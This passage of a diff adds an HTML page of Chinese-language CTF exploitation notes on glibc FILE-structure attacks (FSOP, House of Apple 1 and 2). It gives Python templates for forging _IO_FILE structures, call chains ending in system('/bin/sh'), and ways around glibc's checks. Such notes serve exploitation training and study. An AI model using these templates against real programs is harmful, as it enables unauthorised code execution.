+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># find _IO_str_jumps</span>
+</span></span><span class="line"><span class="cl"><span class="n">IO_file_jumps</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_file_jumps&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">IO_str_underflow</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;_IO_str_underflow&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span>
+</span></span><span class="line"><span class="cl"><span class="n">IO_str_underflow_ptr</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">IO_str_underflow</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">IO_str_jumps</span> <span class="o">=</span> <span class="n">IO_str_underflow_ptr</span><span class="p">[</span><span class="n">bisect_left</span><span class="p">(</span><span class="n">IO_str_underflow_ptr</span><span class="p">,</span> <span class="n">IO_file_jumps</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)]</span> <span class="o">-</span> <span class="mh">0x20</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_read_end</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_read_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># _IO_write_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">n64</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>  <span class="c1"># _IO_write_ptr</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_write_end</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">tcache_pthread_struct_addr</span><span class="p">)</span>  <span class="c1"># _IO_buf_base;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">tcache_pthread_struct_addr</span><span class="p">)</span>  <span class="c1"># _IO_buf_end should usually be (_IO_buf_base + 1)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>  <span class="c1"># from _IO_save_base to _markers</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">file2_addr</span><span class="p">)</span>  <span class="c1"># the FILE chain ptr</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>  <span class="c1"># _fileno for stderr is 2</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _flags2, usually 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span>  <span class="c1"># _old_offset, -1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _cur_column</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span>  <span class="c1"># _vtable_offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>  <span class="c1"># _shortbuf[1]</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># padding</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1ea0</span><span class="p">)</span>  <span class="c1"># _IO_stdfile_1_lock</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span>  <span class="c1"># _offset, -1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _codecvt, usually 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x160</span><span class="p">)</span>  <span class="c1"># _IO_wide_data_1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>  <span class="c1"># from _freeres_list to __pad5</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xFFFFFFFF</span><span class="p">)</span>  <span class="c1"># _mode, usually -1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">19</span>  <span class="c1"># _unused2</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">=</span> <span class="n">fake_file1</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xD8</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># adjust to vtable</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">IO_str_jumps</span><span class="p">)</span>  <span class="c1"># fake vtable</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>构造fake_file2，板子同上，区别为``_IO_buf_base<code>指向</code>fake tcache_perthread_struct<code>，</code>_IO_buf_end<code>设置为</code>fake tcache_perthread_struct + (0x288 - 0x100) / 2<code>，会用到memcpy拷贝，且</code>_chain`指向fake_file3，且编辑fake tcache_perthread_struct即chunk1</li>
+<li>构造fake_file3，<code>_chain</code>指向fake_file4，``_IO_buf_base<code>指向</code>chunk5`，构造chunk5为sh字符串以及system函数地址</li>
+<li>退出时触发</li>
+</ul>
+<p><strong>调用过程</strong></p>
+<ul>
+<li>第一个<code>_IO_FILE</code>由<code>_IO_flush_all</code>调用<code>_IO_str_overflow</code>中的free函数将<code>tcache_perthread_struct</code>释放</li>
+<li>第二个<code>_IO_FILE</code>先调用<code>_IO_str_overflow</code>中malloc函数将<code>tcache_perthread_struct</code>申请出来，调用<code>memcpy</code>用<code>fake tcache_perthread_struct</code>内容控制<code>tcache_perthread_struct</code>中的数据，使其中<code>entries</code>指向<code>&amp;memcpy@got - 0x10</code>，使得后续可以通过size等比计算从相应位置申请出来</li>
+<li>第三个<code>_IO_FILE</code>调用<code>_IO_str_overflow</code>中malloc函数将<code>&amp;memcpy@got - 0x10</code>申请出来，用<code>memcpy</code>将<code>memcpy@got</code>覆盖为system函数地址，将<code>&amp;memcpy@got - 0x10</code>处写入<code>/bin/sh</code>字符串</li>
+<li>第四个<code>_IO_FILE</code>调用malloc将<code>&amp;memcpy@got - 0x10</code>申请出来，调用memcpy即调用<code>system(&quot;/bin/sh&quot;)</code></li>
+</ul>
+<h4 id="house-of-apple">House of Apple</h4>
+<h5 id="house-of-apple1">House of Apple1</h5>
+<ul>
+<li>glibc&gt;2.34，只有一次任意地址写（large bin attack）进行FSOP</li>
+<li>需泄露libc基址和堆地址，且从main函数返回或调用<code>exit</code>函数</li>
+</ul>
+<p><strong>原理</strong></p>
+<p>main函数返回调用链：<code>exit</code> &gt; <code>fcloseall</code> &gt; <code>_IO_cleanup</code> &gt; <code>_IO_flush_all_lockp</code> &gt; <code>_IO_OVERFLOW</code></p>
+<p>遍历<code>_IO_list_all</code>存放的每一个<code>IO_FILE</code>结构体，调用<code>vtable-&gt;_overflow</code>指针指向的函数，劫持<code>_IO_list_all</code>替换为伪造<code>IO_FILE</code>，利用<code>_IO_FILE</code>的成员<code>_wide_data</code>，<code>struct _IO_wide_data *_wide_data</code>在<code>_IO_FILE</code>中偏移为0xa0</p>
+<p><code>overflow_buf</code>相对于<code>_IO_FILE</code>结构体的偏移为<code>0xf0</code></p>
+<ul>
+<li>伪造<code>_wide_data</code>，在<code>_IO_wstrn_overflow</code>函数中可将已知地址空间上某值修改为一个已知值</li>
+<li>由<code>_IO_wstrn_overflow</code>可控制从<code>fp-&gt;_wide_data</code>开始一定范围内的内存值，等价于<strong>任意地址写已知地址</strong></li>
+</ul>
+<p><strong>利用</strong></p>
+<p>堆伪造<code>_IO_FILE</code>结构体，且已知其地址为<strong>A</strong>，将<strong>A+0xd8</strong>替换为<code>_IO_wstrn_jumps</code>地址，<strong>A+0xc0</strong>设置为<strong>B</strong>，设置其他成员以能调用到<code>_IO_OVERFLOW</code>，<code>exit</code>会一路调用到<code>_IO_wstrn_overflow</code>，将<strong>B</strong>至<strong>B+0x38</strong>的地址区域内容替换为<strong>A+0xf0</strong>或<strong>A+0x1f0</strong></p>
+<p><strong>绕过</strong>：</p>
+<ul>
+<li>
+<p><code>f-&gt;_wide_data-&gt;_IO_buf_base</code>为空或<code>f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF</code>不为0，其中<code>_IO_FLAGS2_USER_WBUF</code>为8，绕过<code>_IO_wsetb</code>函数中的<code>free</code>函数</p>
+</li>
+<li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>满足<code>fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf</code>进入<code>_IO_wstrn_overflow</code>的<code>if</code>判断</p>
+</li>
+<li>
+<p>满足<code>fp-&gt;_mode &lt;= 0</code>以及<code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code>可用于FSOP触发</p>
+</li>
+</ul>
+<p><strong>思路</strong></p>
+<p>① 修改tcache线程变量</p>
+<ul>
+<li>伪造至少2个<code>_IO_FILE</code>结构体</li>
+<li>第一个<code>_IO_FILE</code>执行<code>_IO_OVERFLOW</code>利用<code>_IO_wstrn_overflow</code>修改<code>tcache</code>全局变量为已知值，控制<code>tcache bin</code>分配</li>
+<li>第二个<code>_IO_FILE</code>执行<code>_IO_OVERFLOW</code>利用<code>malloc</code>任意地址分配并使用<code>memcpy</code>任意地址写任意值</li>
+<li>用2次任意地址写任意值修改<code>pointer_guard</code>，<code>IO_accept_foreign_vtables</code>值绕过<code>_IO_vtable_check</code>函数检测，或利用任意地址写修改<code>libc.got</code>函数地址，很多IO流函数调用<code>strlen/strcpy/memcpy/memset</code>会调用got表中函数</li>
+<li>利用一个<code>_IO_FILE</code>随意伪造vtable劫持也可</li>
+</ul>
+<p>② 修改<code>mp_</code>结构体</p>
+<ul>
+<li>
+<p>至少伪造2个<code>_IO_FILE</code>结构体</p>
+</li>
+<li>
+<p>第一个<code>_IO_FILE</code>执行<code>_IO_OVERFLOW</code>利用<code>_IO_wstrn_overflow</code>修改<code>mp_.tcache_bins</code>为极大值，使得大chunk也通过<code>tcachebin</code>管理</p>
+</li>
+<li>
+<p>或修改掉<code>tcache_count</code>可以控制链表的 <code>chunk</code> 的数量</p>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">tcache_bins</span> <span class="o">=</span> <span class="n">mp_</span> <span class="o">+</span> <span class="mi">80</span>
+</span></span><span class="line"><span class="cl"><span class="n">tcache_max_bytes</span> <span class="o">=</span> <span class="n">mp_</span> <span class="o">+</span> <span class="mi">88</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/img/pwn_note.zh-cn.assets/-172844676894978.assets"
+	
+	
+	
+	loading="lazy"
+	
+		alt="img"
+	
+	
+></p>
+<p>③ 修改<code>pointer_guard</code></p>
+<ul>
+<li>至少伪造2个<code>_IO_FILE</code>结构体</li>
+<li>第一个<code>_IO_FILE</code>执行<code>_IO_OVERFLOW</code>利用<code>_IO_wstrn_overflow</code>修改<code>tls</code>结构体<code>pointer_guard</code>值为已知值</li>
+<li>第二个<code>_IO_FILE</code>结构体用来做<code>house of emma</code>劫持程序执行流</li>
+</ul>
+<p>④ 修改<code>global_max_fast</code>全局变量</p>
+<h5 id="house-of-apple2">House of Apple2</h5>
+<p>四种利用可通过 gdb <code>tele &amp;_IO_file_jumps</code>来找到对应四个函数地址</p>
+<p>① <code>_IO_wfile_overflow</code></p>
+<ul>
+<li><code>_wide_data</code>结构中由类似<code>vtable</code>的<code>_wide_vtable</code>指向<code>_IO_jump_t</code>结构</li>
+<li>glibc定义了调用<code>_wide_vtable</code>中函数的宏，其中<code>_IO_WSETBUF, _IO_WUNDERFLOW, _IO_WDOALLOCATE, _IO_WOVERFLOW</code>等缺少对<code>_wide_vtable</code>位置检查</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// _IO_wdoallocbuf函数中_IO_WDOALLOCATE宏
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">((</span><span class="o">*</span><span class="p">(</span><span class="n">__typeof__</span> <span class="p">(((</span><span class="k">struct</span> <span class="n">_IO_FILE</span><span class="p">){}).</span><span class="n">_wide_data</span><span class="p">)</span> <span class="o">*</span><span class="p">)(((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="p">((</span><span class="n">fp</span><span class="p">)))</span> <span class="o">+</span> <span class="n">__builtin_offsetof</span> <span class="p">(</span><span class="k">struct</span> <span class="n">_IO_FILE</span><span class="p">,</span> <span class="n">_wide_data</span><span class="p">)))</span><span class="o">-&gt;</span><span class="n">_wide_vtable</span><span class="o">-&gt;</span><span class="n">__doallocate</span><span class="p">)</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>修改<code>vtable</code>，程序调用<code>_wide_vtable</code>中函数，再将<code>_wide_vtable</code>指向一个伪造函数表劫持执行流</li>
+</ul>
+<p><strong>利用</strong></p>
+<p><img src="/img/pwn_note.zh-cn.assets/image-20250124161719221.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250124161719221"
+	
+	
+></p>
+<ul>
+<li>large bin attack劫持<code>_IO_list_all</code>为相应large bin chunk，在该large bin chunk伪造</li>
+<li>exit退出触发</li>
+</ul>
+<p><strong>模板</strong></p>
+<p>前两个标志，<code>prev_size</code>设置为<code>0xfbad1880</code>，<code>size</code>设置为<code>;sh;</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># file_addr为chunk地址</span>
+</span></span><span class="line"><span class="cl"><span class="n">IO_wide_data_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">file_addr</span> <span class="o">+</span> <span class="mh">0xd8</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xe0</span>
+</span></span><span class="line"><span class="cl"><span class="n">wide_vtable_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">file_addr</span> <span class="o">+</span> <span class="mh">0xd8</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x68</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_read_end</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_read_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_write_base</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>  <span class="c1"># _IO_write_ptr</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_write_end</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_buf_base;</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _IO_buf_end should usually be (_IO_buf_base + 1)</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>  <span class="c1"># from _IO_save_base to _markers</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># the FILE chain ptr</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>  <span class="c1"># _fileno for stderr is 2</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _flags2, usually 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span>  <span class="c1"># _old_offset, -1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _cur_column</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span>  <span class="c1"># _vtable_offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>  <span class="c1"># _shortbuf[1]</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># padding</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_2_1_stdout_&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x1ea0</span><span class="p">)</span>  <span class="c1"># _IO_stdfile_1_lock</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xFFFFFFFFFFFFFFFF</span><span class="p">)</span>  <span class="c1"># _offset, -1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>  <span class="c1"># _codecvt, usually 0</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">IO_wide_data_addr</span><span class="p">)</span>  <span class="c1"># _wide_data</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>  <span class="c1"># from _freeres_list to __pad5</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xFFFFFFFF</span><span class="p">)</span>  <span class="c1"># _mode, usually -1</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="mi">19</span>  <span class="c1"># _unused2</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">=</span> <span class="n">fake_file</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0xD8</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>  <span class="c1"># adjust to vtable</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;_IO_wfile_jumps&#39;</span><span class="p">])</span>  <span class="c1"># fake vtable</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">wide_vtable_addr</span><span class="p">)</span> <span class="c1"># _wide_vtable</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_file</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span> <span class="c1"># doallocate</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>调用链</strong>：<code>_IO_wfile_overflow</code> &gt; <code>_IO_wdoallocbuf</code> &gt; <code>_IO_WDOALLOCATE</code> &gt; <code>*(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">wint_t</span> <span class="nf">_IO_wfile_overflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="n">wint_t</span> <span class="n">wch</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">){</span> <span class="c1">// 需要为0绕过
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">((</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_CURRENTLY_PUTTING</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="c1">// 需要进入
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="o">||</span> <span class="n">f</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="n">f</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>
+</span></span><span class="line"><span class="cl">	  <span class="n">_IO_wdoallocbuf</span> <span class="p">(</span><span class="n">f</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
